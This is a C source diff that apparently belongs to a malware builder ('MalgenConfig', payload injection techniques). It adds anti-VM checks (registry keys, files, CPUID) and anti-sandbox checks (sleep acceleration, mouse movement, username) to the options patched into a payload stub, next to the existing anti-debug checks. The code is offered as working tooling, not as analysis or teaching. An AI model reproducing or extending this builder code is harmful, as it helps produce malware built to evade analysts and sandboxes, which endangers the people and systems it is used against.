@@ -20,6 +20,12 @@
 #define OFF_CHECK_DBGOBJ    (OFF_CHECK_DBGPORT + 1)
 #define OFF_CHECK_HWBP      (OFF_CHECK_DBGOBJ + 1)
 #define OFF_CHECK_REMOTE    (OFF_CHECK_HWBP + 1)
+#define OFF_CHECK_VM_REG    (OFF_CHECK_REMOTE + 1)
+#define OFF_CHECK_VM_FILES  (OFF_CHECK_VM_REG + 1)
+#define OFF_CHECK_VM_CPUID  (OFF_CHECK_VM_FILES + 1)
+#define OFF_CHECK_SLEEP     (OFF_CHECK_VM_CPUID + 1)
+#define OFF_CHECK_MOUSE     (OFF_CHECK_SLEEP + 1)
+#define OFF_CHECK_USERNAME  (OFF_CHECK_MOUSE + 1)
 
 BYTE GetTechniqueIndex(InjectionTechnique technique) {
 	switch (technique) {
@@ -175,6 +181,12 @@ BOOL PatchBinary(MalgenConfig* config, LPVOID payload, SIZE_T payload_size) {
 	*(stub_data + marker_offset + OFF_CHECK_DBGOBJ) = (BYTE)config->anti_analysis.anti_debug.check_debug_object;
 	*(stub_data + marker_offset + OFF_CHECK_HWBP) = (BYTE)config->anti_analysis.anti_debug.check_hardware_breakpoints;
 	*(stub_data + marker_offset + OFF_CHECK_REMOTE) = (BYTE)config->anti_analysis.anti_debug.check_remote_debugger;
+	*(stub_data + marker_offset + OFF_CHECK_VM_REG) = (BYTE)config->anti_analysis.anti_vm.check_registry_keys;
+	*(stub_data + marker_offset + OFF_CHECK_VM_FILES) = (BYTE)config->anti_analysis.anti_vm.check_files;
+	*(stub_data + marker_offset + OFF_CHECK_VM_CPUID) = (BYTE)config->anti_analysis.anti_vm.check_cpuid;
+	*(stub_data + marker_offset + OFF_CHECK_SLEEP) = (BYTE)config->anti_analysis.anti_sandbox.check_sleep_acceleration;
+	*(stub_data + marker_offset + OFF_CHECK_MOUSE) = (BYTE)config->anti_analysis.anti_sandbox.check_mouse_movement;
+	*(stub_data + marker_offset + OFF_CHECK_USERNAME) = (BYTE)config->anti_analysis.anti_sandbox.check_username;
 
 	hOutput = CreateFileA(config->output_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 	if (hOutput == INVALID_HANDLE_VALUE) {
